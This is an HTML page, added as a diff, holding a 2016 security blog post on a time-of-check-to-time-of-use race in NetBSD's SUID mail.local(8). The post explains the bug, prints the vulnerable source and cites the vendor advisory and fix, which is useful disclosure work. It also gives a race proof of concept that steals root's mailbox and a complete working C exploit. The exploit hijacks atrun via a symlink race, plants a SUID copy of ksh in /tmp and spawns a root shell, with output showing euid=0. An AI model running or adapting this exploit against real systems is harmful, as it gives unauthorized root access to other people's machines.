@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<title>akat1 - Spawn your shell like it's 90s again!</title>
+        <link rel="stylesheet" href="css/normalize.css">
+        <link rel="stylesheet" href="css/skeleton.css">
+		<link rel="stylesheet" href="css/style.css">
+	</head>
+	<body>
+        <div class="container">
+            <div class="row">
+                <div class="header">
+                    <pre>
+ ▄▄▄       ██ ▄█▀▄▄▄     ▄▄▄█████▓ ██▓     ██████ ▓█████  ▄████▄   ██▀███  ▓█████▄▄▄█████▓   ▓█████▄  ██▓ ▄▄▄       ██▀███ ▓██   ██▓
+▒████▄     ██▄█▒▒████▄   ▓  ██▒ ▓▒▓██▒   ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  ▓██ ▒ ██▒▓█   ▀▓  ██▒ ▓▒   ▒██▀ ██▌▓██▒▒████▄    ▓██ ▒ ██▒▒██  ██▒
+▒██  ▀█▄  ▓███▄░▒██  ▀█▄ ▒ ▓██░ ▒░▒██▒   ░ ▓██▄   ▒███   ▒▓█    ▄ ▓██ ░▄█ ▒▒███  ▒ ▓██░ ▒░   ░██   █▌▒██▒▒██  ▀█▄  ▓██ ░▄█ ▒ ▒██ ██░
+░██▄▄▄▄██ ▓██ █▄░██▄▄▄▄██░ ▓██▓ ░ ░██░     ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒▒██▀▀█▄  ▒▓█  ▄░ ▓██▓ ░    ░▓█▄   ▌░██░░██▄▄▄▄██ ▒██▀▀█▄   ░ ▐██▓░
+ ▓█   ▓██▒▒██▒ █▄▓█   ▓██▒ ▒██▒ ░ ░██░   ▒██████▒▒░▒████▒▒ ▓███▀ ░░██▓ ▒██▒░▒████▒ ▒██▒ ░    ░▒████▓ ░██░ ▓█   ▓██▒░██▓ ▒██▒ ░ ██▒▓░
+ ▒▒   ▓▒█░▒ ▒▒ ▓▒▒▒   ▓▒█░ ▒ ░░   ░▓     ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░░░ ▒░ ░ ▒ ░░       ▒▒▓  ▒ ░▓   ▒▒   ▓▒█░░ ▒▓ ░▒▓░  ██▒▒▒ 
+  ▒   ▒▒ ░░ ░▒ ▒░ ▒   ▒▒ ░   ░     ▒ ░   ░ ░▒  ░ ░ ░ ░  ░  ░  ▒     ░▒ ░ ▒░ ░ ░  ░   ░        ░ ▒  ▒  ▒ ░  ▒   ▒▒ ░  ░▒ ░ ▒░▓██ ░▒░ </pre>
+                    <b>[<a href="/">blog</a>] [<a href="https://twitter.com/akat1_pl">twitter</a>] [<a href="https://github.com/akat1/">github</a>] [<a href="https://pgp.mit.edu/pks/lookup?op=get&search=0xBA0611974495BFB3">mail/gpg</a>]</b>
+                </div>
+            </div>
+            <div class="row">
+                <div class="row"><a href="?id=2"><span class="title">Spawn your shell like it's 90s again!</span></a><br><span class="date">2016-07-21 09:09:58</span><br><div class="note"><h5>Spawn your shell like it's 90s again!</h5>
+
+<p>This article is a quick walk-through to gaining root privileges in the NetBSD,
+since it's so 90s you can play Captain Jack <a href="https://www.youtube.com/watch?v=boNRVXR7bqg">[3]</a>, or <a href="https://www.youtube.com/watch?v=YLND32bEbgI">[4]</a> <a href="https://www.youtube.com/watch?v=s88xIW_SB7Q">[5]</a> if you prefer
+polish disco, just to feel the atmosphere while reading. Really, do it! ;)</p>
+
+<p>Abusing SUID files should be dead in 90s, but surprisingly it's still alive.
+By auditing Coverity Scan reports for the NetBSD SUID files I accidentally found a Time To Check To Time To
+Use <a href="https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use">[1]</a> issue in mail.local(8) which luckily can be turned into privilege
+escalation! You may ask what's mail.local(8)... It simply delivers message from
+standard input to chosen user mailbox - check man page if you wish to know
+more. The utility appears also in other BSDs, but it seems that OpenBSD fixed
+the issue almost 20 years ago and FreeBSD uses sendmail(8) which provides its own implementation.</p>
+
+<h5>The bug</h5>
+
+The bug is placed in deliver() function of mail.local:
+
+<pre><code>177 static int
+178 deliver(int fd, char *name, int lockfile)
+179 {
+180 	struct stat sb;
+181 	struct passwd pwres, *pw;
+182 	char pwbuf[1024];
+183 	int created, mbfd, nr, nw, off, rval=EX_OK, lfd=-1;
+184 	char biffmsg[100], buf[8*1024], path[MAXPATHLEN], lpath[MAXPATHLEN];
+185 	off_t curoff;
+[...]
+200 	(void)snprintf(path, sizeof path, "%s/%s", _PATH_MAILDIR, name);
+[...]
+213 	if (!(created = lstat(path, &amp;sb)) &amp;&amp;
+214 	    (sb.st_nlink != 1 || S_ISLNK(sb.st_mode))) {
+215 		logwarn("%s: linked file", path);
+216 		return(EX_OSERR);
+217 	}
+218 
+219 	if ((mbfd = open(path, O_APPEND|O_WRONLY|O_EXLOCK,
+220 	    S_IRUSR|S_IWUSR)) &lt; 0) {
+221 		if ((mbfd = open(path, O_APPEND|O_CREAT|O_WRONLY|O_EXLOCK,
+222 		    S_IRUSR|S_IWUSR)) &lt; 0) {
+223 			logwarn("%s: %s", path, strerror(errno));
+224 			return(EX_OSERR);
+225 		}
+226 	}
+[...]
+262 	if (created)
+263 		(void)fchown(mbfd, pw-&gt;pw_uid, pw-&gt;pw_gid);
+264 
+265 	(void)fsync(mbfd);		/* Don't wait for update. */
+266 	(void)close(mbfd);		/* Implicit unlock. */
+[...]
+
+<b>Source</b>: <a href="https://nxr.netbsd.org/xref/src/libexec/mail.local/mail.local.c">https://nxr.netbsd.org/xref/src/libexec/mail.local/mail.local.c</a><br></code></pre>
+
+
+<p>The code creates path from _PATH_MAILDIR (which is "/var/mail/") and username
+at line 200, then lstat is done at line 213, if file does not exist (or it's not a symlink)
+the path is opened at line 219.  What if somebody would quickly replace object between lstat(2) and open(2) under
+the checked path? Well, then arbitrary file can be opened, some data will be
+appended, and then, eventually, the ownership will be changed. It's the classical race condition example.</p>
+
+
+<p>The cool thing about this particular issue is that no memory corruption issues
+are involved, so we don't need to deal with PIE, ASLR and so on. Instead we
+got pretty nice race, thus it's all about the timing.</p>
+
+<h5>Errr... so what? Time window is too small, they said!</h5>
+
+<p>No time window is too small to be exploited! It's just a matter of trying
+hard enough. Let's analyze carefully the case that we have:</p>
+
+<pre><code> <b>mail.local</b>                                                |<b>attacker</b>
+ ----------------------------------------------------------+---------------------------------------------
+ lstat() - returns ENOENT - the named file does not exist. |
+                                                           | symlink() - an attacker creates symlink that
+                                                           | points to a sensitive file.
+ open() - opens sensitive file through symlink             |
+ (...)                                                     |
+ fchown() - changes owner to user                          |
+                                                           | <b>\o/ PROFIT \o/</b></code></pre>
+
+<p>The moment between lstat(2) and open(2) is our chance to plant malicious
+symlink. This is a classic race condition example, you may think it could take
+ages to trigger the above scenario, but in fact it can occur within a few
+seconds. Let's steal /var/mail/root file:</p>
+
+<pre><code><b>shm@netbsd-dev ~ $ ls -al /var/mail/root</b>
+-rw-------  1 root  wheel  38 Jul 21 16:08 /var/mail/root
+</code></pre>
+
+<p>We need two workers. First is supposed to create symlinks, second is
+responsible for executing mail.local(8).</p>
+
+<pre><code><b>shm@netbsd-dev ~ $ cat test.c</b>
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;stdlib.h&gt;
+
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+
+#define STEALPATH       "/var/mail/root"
+#define MAILBOX         "/var/mail/shm"
+
+int
+main() {
+        int fd;
+        struct stat sb;
+
+        for(;;) {
+                unlink(MAILBOX);
+                symlink(STEALPATH, MAILBOX);
+                sync();
+                unlink(MAILBOX);
+                fd = open(MAILBOX, O_CREAT, S_IRUSR | S_IWUSR);
+                close(fd);
+                sync();
+                if (lstat(STEALPATH, &amp;sb) == 0) {
+                        if (sb.st_uid == getuid()) {
+                                fprintf(stderr, "[+] won race!\n");
+                                return 0;
+                        }
+                }
+        }
+
+        /* NOTREACHED */
+        return 1;
+}
+<b>shm@netbsd-dev ~ $ cc -o test test.c</b>
+<b>shm@netbsd-dev ~ $ while true ; do echo x | /usr/libexec/mail.local shm 2&gt; /dev/null ; done &amp;</b>
+[3] 5084
+<b>shm@netbsd-dev ~ $ time ./test</b>
+[+] won race!
+
+real    0m3.093s
+user    0m0.000s
+sys     0m2.987s
+<b>shm@netbsd-dev ~ $ ls -al /var/mail/root</b>
+-rw-------  1 shm  shm  77 Jul 21 16:12 /var/mail/root
+</code></pre>
+
+<p>Within few seconds, we're able to steal root's mailbox, not bad!</p>
+
+<h5>Uh I see, what's next?</h5>
+
+<p>So we can became an owner of any file in the system, using that possibility into
+privilege escalation should be easy - actually, there are many ways to do it. One of them is to
+own passwd, master.passwd and company in order to manipulate system accounts - but
+tha intrusive and overcomplicated. Instead of this, let's see what's executed
+repetitively by administrative accounts, own that and change its context to
+get a shell.</p>
+
+<p>Natural candidate is crontab(8), default tasks look as follows:</p>
+
+<pre><code>[...]
+#minute	hour	mday	month	wday	command
+#
+*/10	*	*	*	*	/usr/libexec/atrun
+#
+# rotate log files every hour, if necessary
+0	*	*	*	*	/usr/bin/newsyslog
+#
+# do daily/weekly/monthly maintenance
+15	3	*	*	*	/bin/sh /etc/daily 2&gt;&amp;1 | tee /var/log/daily.out | sendmail -t
+30	4	*	*	6	/bin/sh /etc/weekly 2&gt;&amp;1 | tee /var/log/weekly.out | sendmail -t
+#30	5	1	*	*	/bin/sh /etc/monthly 2&gt;&amp;1 | tee /var/log/monthly.out | sendmail -t
+[...]
+
+<b>Source</b>: <a href="https://nxr.netbsd.org/xref/src/etc/crontab">https://nxr.netbsd.org/xref/src/etc/crontab</a><br></code></pre>
+
+<p>Of course we do want to wait a month or even a day for shell spawn. The best
+option is to change atrun(1), triggered every 10 minutes - which is
+an acceptable time to wait for root privileges, isn't it?</p>
+
+<p>What to execute? The simplest idea is to copy ksh to /tmp directory and set SUID
+bit. Example script is uber simple:</p>
+
+<pre><code>#! /bin/sh
+cp /bin/ksh /tmp/ksh
+chmod +s /tmp/ksh</code></pre>
+
+<p>Upon this script is executed, we get SUIDed shell in /tmp, ksh doesn't drop
+effective uid and gid, so we can get it 0 by using setuid(2) and setgid(2).</p>
+
+<h5>Putting things together</h5>
+
+We have all the pieces, let's craft an exploit:
+
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;err.h&gt;
+#include &lt;sys/wait.h&gt;
+
+#define ATRUNPATH "/usr/libexec/atrun"
+#define MAILDIR "/var/mail"
+
+static int
+overwrite_atrun(void)
+{
+        char *script = "#! /bin/sh\n"
+            "cp /bin/ksh /tmp/ksh\n"
+            "chmod +s /tmp/ksh\n";
+        size_t size;
+        FILE *fh;
+        int rv = 0;
+
+        fh = fopen(ATRUNPATH, "wb");
+
+        if (fh == NULL) {
+                rv = -1;
+                goto out;
+        }
+
+        size = strlen(script);
+        if (size != fwrite(script, 1, strlen(script), fh)) {
+                rv =  -1;
+                goto out;
+        }
+
+out:
+        if (fh != NULL &amp;&amp; fclose(fh) != 0)
+                rv = -1;
+
+        return rv;
+}
+
+static int
+copy_file(const char *from, const char *dest, int create)
+{
+        char buf[1024];
+        FILE *in = NULL, *out = NULL;
+        size_t size;
+        int rv = 0, fd;
+
+        in = fopen(from, "rb");
+        if (create == 0)
+                out = fopen(dest, "wb");
+        else {
+                fd = open(dest, O_WRONLY | O_EXCL | O_CREAT, S_IRUSR |
+                    S_IWUSR);
+                if (fd == -1) {
+                        rv = -1;
+                        goto out;
+                }
+                out = fdopen(fd, "wb");
+        }
+
+        if (in == NULL || out == NULL) {
+                rv = -1;
+                goto out;
+        }
+
+        while ((size = fread(&amp;buf, 1, sizeof(buf), in)) &gt; 0) {
+                if (fwrite(&amp;buf, 1, size, in) != 0) {
+                        rv = -1;
+                        goto out;
+                }
+        }
+
+out:
+        if (in != NULL &amp;&amp; fclose(in) != 0)
+                rv = -1;
+        if (out != NULL &amp;&amp; fclose(out) != 0)
+                rv = -1;
+        
+        return rv;
+}
+
+int
+main()
+{
+        pid_t pid;
+        uid_t uid;
+        struct stat sb;
+        char *login, *mailbox, *mailbox_backup = NULL, *atrun_backup, *buf;
+
+        umask(0077);
+
+        login = getlogin();
+
+        if (login == NULL)
+                err(EXIT_FAILURE, "who are you?");
+
+        uid = getuid();
+
+        asprintf(&amp;mailbox, MAILDIR "/%s", login);
+
+        if (mailbox == NULL)
+                err(EXIT_FAILURE, NULL);
+
+        if (access(mailbox, F_OK) != -1) {
+                /* backup mailbox */
+                asprintf(&amp;mailbox_backup, "/tmp/%s", login);
+                if (mailbox_backup == NULL)
+                        err(EXIT_FAILURE, NULL);
+        }
+
+        if (mailbox_backup != NULL) {
+                fprintf(stderr, "[+] backup mailbox %s to %s\n", mailbox,
+                    mailbox_backup);
+
+                if (copy_file(mailbox, mailbox_backup, 1))
+                        err(EXIT_FAILURE, "[-] failed");
+        }
+
+        /* backup atrun(1) */
+        atrun_backup = strdup("/tmp/atrun");
+        if (atrun_backup == NULL)
+                err(EXIT_FAILURE, NULL);
+
+        fprintf(stderr, "[+] backup atrun(1) %s to %s\n", ATRUNPATH,
+            atrun_backup);
+
+        if (copy_file(ATRUNPATH, atrun_backup, 1))
+                err(EXIT_FAILURE, "[-] failed");
+
+        /* win the race */
+        fprintf(stderr, "[+] try to steal %s file\n", ATRUNPATH);
+
+        switch (pid = fork()) {
+        case -1:
+                err(EXIT_FAILURE, NULL);
+                /* NOTREACHED */
+
+        case 0:
+                asprintf(&amp;buf, "echo x | /usr/libexec/mail.local -f xxx %s "
+                    "2&gt; /dev/null", login);
+
+                for(;;)
+                        system(buf);
+                /* NOTREACHED */
+
+        default:
+                umask(0022);
+                for(;;) {
+                        int fd;
+                        unlink(mailbox);
+                        symlink(ATRUNPATH, mailbox);
+                        sync();
+                        unlink(mailbox);
+                        fd = open(mailbox, O_CREAT, S_IRUSR | S_IWUSR);
+                        close(fd);
+                        sync();
+                        if (lstat(ATRUNPATH, &amp;sb) == 0) {
+                                if (sb.st_uid == uid) {
+                                        kill(pid, 9);
+                                        fprintf(stderr, "[+] won race!\n");
+                                        break;
+                                }
+                        }
+                }
+                break;
+        }
+        (void)waitpid(pid, NULL, 0);
+
+        if (mailbox_backup != NULL) {
+                /* restore mailbox */
+                fprintf(stderr, "[+] restore mailbox %s to %s\n",
+                    mailbox_backup, mailbox);
+
+                if (copy_file(mailbox_backup, mailbox, 0))
+                        err(EXIT_FAILURE, "[-] failed");
+                if (unlink(mailbox_backup) != 0)
+                        err(EXIT_FAILURE, "[-] failed");
+        }
+
+        /* overwrite atrun */
+        fprintf(stderr, "[+] overwriting atrun(1)\n");
+
+        if (chmod(ATRUNPATH, 0755) != 0)
+                err(EXIT_FAILURE, NULL);
+
+        if (overwrite_atrun())
+                err(EXIT_FAILURE, NULL);
+
+        fprintf(stderr, "[+] waiting for atrun(1) execution...\n");
+
+        for(;;sleep(1)) {
+                if (access("/tmp/ksh", F_OK) != -1)
+                        break;
+        }
+
+        /* restore atrun */
+        fprintf(stderr, "[+] restore atrun(1) %s to %s\n", atrun_backup,
+            ATRUNPATH);
+
+        if (copy_file(atrun_backup, ATRUNPATH, 0))
+                err(EXIT_FAILURE, "[-] failed");
+        if (unlink(atrun_backup) != 0)
+                err(EXIT_FAILURE, "[-] failed");
+
+        if (chmod(ATRUNPATH, 0555) != 0)
+                err(EXIT_FAILURE, NULL);
+
+        fprintf(stderr, "[+] done! Don't forget to change atrun(1) "
+            "ownership.\n");
+        fprintf(stderr, "Enjoy your shell:\n");
+
+        execl("/tmp/ksh", "ksh", NULL);
+
+        return 0;
+}
+</code></pre>
+
+<p>Code is rather self-explanatory, executing is more interesting:</p>
+
+<pre><code><b>shm@netbsd-dev ~ $ uname -a</b>
+NetBSD netbsd-dev 7.99.33 NetBSD 7.99.33 (GENERIC) #42: Tue Jul  5 21:30:23 CEST 2016
+  shm@netbsd-dev:/usr/cvs/src/sys/arch/amd64/compile/obj/GENERIC amd64
+<b>shm@netbsd-dev ~ $ id</b>
+uid=666(shm) gid=666(shm) groups=666(shm)
+<b>shm@netbsd-dev ~ $ ./mail.local.exp</b>
+[+] backup mailbox /var/mail/shm to /tmp/shm
+[+] backup atrun(1) /usr/libexec/atrun to /tmp/atrun
+[+] try to steal /usr/libexec/atrun file
+[+] won race!
+[+] restore mailbox /tmp/shm to /var/mail/shm
+[+] overwriting atrun(1)
+[+] waiting for atrun(1) execution...
+[+] restore atrun(1) /tmp/atrun to /usr/libexec/atrun
+[+] done! Don't forget to change atrun(1) ownership.
+Enjoy your shell:
+<b># id</b>
+uid=666(shm) gid=666(shm) euid=0(root) egid=0(wheel) groups=666(shm)
+</code></pre>
+
+<h5>Final words</h5>
+
+<p>NetBSD is an elegant operating system with many exciting features as rump(8)
+or veriexec(8), bugs just happen! The best thing we can do, besides fixing
+this particular vulnerability <a href="http://ftp.netbsd.org/pub/NetBSD/security/advisories/NetBSD-SA2016-006.txt.asc">[7]</a>, is to get rid of SUIDs, like some of our
+friends already did. But radical step requires major changes.</p>
+
+<p>Hope to bring you back to the 90s. If this bug is older than you, I'm
+sorry, you missed opportunity to live in the best decade in history of this planet.
+OpenBSD left this bug in the 20th Century <a href="http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/libexec/mail.local/mail.local.c.diff?r1=1.1&amp;r2=1.2&amp;f=h">[6]</a>, just where it belongs.
+Particularly I like few lines from this patch:</p>
+
+<pre><code>/* paranoia? */
+if (fsb.st_nlink != 1 || S_ISLNK(fsb.st_mode)) {
+		err(NOTFATAL, "%s: linked file", path);
+		goto bad;
+}</code></pre>
+
+<p>Exactly, better paranoid than sorry!</p>
+
+<ol>
+    <li><a href="https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use">https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use</a>
+    <li><a href="http://netbsd.gw.com/cgi-bin/man-cgi?mail.local++NetBSD-current">http://netbsd.gw.com/cgi-bin/man-cgi?mail.local++NetBSD-current</a>
+    <li><a href="https://www.youtube.com/watch?v=boNRVXR7bqg">https://www.youtube.com/watch?v=boNRVXR7bqg</a>
+    <li><a href="https://www.youtube.com/watch?v=YLND32bEbgI">https://www.youtube.com/watch?v=YLND32bEbgI</a>
+    <li><a href="https://www.youtube.com/watch?v=s88xIW_SB7Q">https://www.youtube.com/watch?v=s88xIW_SB7Q</a>
+    <li><a href="http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/libexec/mail.local/mail.local.c.diff?r1=1.1&amp;r2=1.2&amp;f=h">http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/libexec/mail.local/mail.local.c.diff?r1=1.1&amp;r2=1.2&amp;f=h</a>
+    <li><a href="http://ftp.netbsd.org/pub/NetBSD/security/advisories/NetBSD-SA2016-006.txt.asc">http://ftp.netbsd.org/pub/NetBSD/security/advisories/NetBSD-SA2016-006.txt.asc</a>
+</ol></div><br></div><div class="row"><a href="?id=1">&lt; Previous</a><span class="right"><a href="?id=3">Next &gt;</a></span></div><div class="row"><label>Comments</label></div><div class="row"><div class="comment"><span class="comment_author">Author: Mj</span><br><span class="date">2016-07-22 15:44:04</span><br>Nice1!<br></div></div><div class="row"><div class="comment"><span class="comment_author">Author: </span><br><span class="date">2016-07-22 16:12:47</span><br>Excellent one, congrats :)<br></div></div><div class="row"><div class="comment"><span class="comment_author">Author: </span><br><span class="date">2016-07-22 16:43:46</span><br>This may be a stupid question, but what do you mean by 'get rid of SUIDs' ?<br>Did you mean, get rid of SUIDs as a mechanism or only for some specific binaries ?<br></div></div><div class="row"><div class="comment"><span class="comment_author">Author: </span><br><span class="date">2016-07-22 19:17:07</span><br>Where is lstat on NetBSD? You may be able to LD_PRELOAD your own version that simply sleeps and then calls the real lstat.<br></div></div><div class="row"><div class="comment"><span class="comment_author">Author: &lt;b&gt;SuidLover&lt;/b&gt;</span><br><span class="date">2016-07-22 22:06:50</span><br>You shouldn't be able to LD_PRELOAD anything into a suid exe...<br></div></div><div class="row"><div class="comment"><span class="comment_author">Author: </span><br><span class="date">2016-07-22 23:47:30</span><br>Loving this blog.<br></div></div><div class="row"><div class="comment"><span class="comment_author">Author: </span><br><span class="date">2016-07-24 01:01:06</span><br>nice format, horrible flow.<br></div></div><div class="row"><div class="comment"><span class="comment_author">Author: </span><br><span class="date">2016-07-24 01:01:51</span><br>me again. don't worry. it may not be &quot;a mistake&quot;.<br></div></div><div class="row"><div class="comment"><span class="comment_author">Author: pew</span><br><span class="date">2016-07-26 09:18:18</span><br>https://ftp.stu.edu.tw/BSD/OpenBSD/src/bin/mkdir/mkdir.c<br>You know what to search for :) Super easy, but much less impact than issue above.<br></div></div><div class="row" style="margin-top: 20px"><form class="comment_form" action="?id=2#footer" method="POST"><div class="row"><label for="author">Name</label><input class="u-full-width" type="text" name="author" id="author" placeholder="Anonymous"><br></div><div class="row"><label for="comment">Comment</label><textarea class="u-full-width" name="comment" rows="15" cols="100" id="comment" placeholder="Your comment..."></textarea><br><input type="hidden" name="note_id" value="2"></div><div class="row"><label for="robot">0x4+004 = ? (type 8)</label><input class="u-full-width" type="text" name="robot" id="robot" placeholder="0x4+004=?"><br></div><input class="button-primary" type="submit" value="Send"></form></div>            </div>
+            <div class="row" id="footer">
+                <div class="footer"><a href="https://en.wikipedia.org/wiki/ISC_license">ISC Licensed</a>, 2016, 2017 by <a href="http://akat1.pl">akat1</a></div>
+            </div>
+        </div>
+	</body>
+</html>
